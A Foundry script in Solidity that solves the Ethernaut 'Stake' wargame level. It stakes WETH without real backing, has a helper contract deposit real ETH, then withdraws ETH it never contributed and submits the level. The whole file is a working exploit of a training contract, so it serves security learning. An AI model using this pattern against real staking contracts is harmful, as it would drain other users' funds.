pragma solidity ^0.8.19;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import {HackContract, Stake} from "../src/Stake.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface Ethernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address payable _instance) external;
}

contract StakeScript is Script {
    function run() external {
        vm.startBroadcast();

        address levelContractAddress = 0x935F24648bD3158E318e5C0830986a431dA11FB1;
        Stake s = Stake(levelContractAddress);

        // 1. stake fake 0.0011 weth
        ERC20 weth = ERC20(s.WETH());
        weth.approve(levelContractAddress, 0.0011 ether);
        s.StakeWETH(0.0011 ether);

        // 2. others stake real 0.0012 eth
        HackContract hc = new HackContract();
        hc.hack{value : 0.0012 ether}();

        // unstake the real 0.0011 ether
        s.Unstake(0.0011 ether);

        Ethernaut e = Ethernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
        e.submitLevelInstance(payable(levelContractAddress));

        vm.stopBroadcast();
    }
}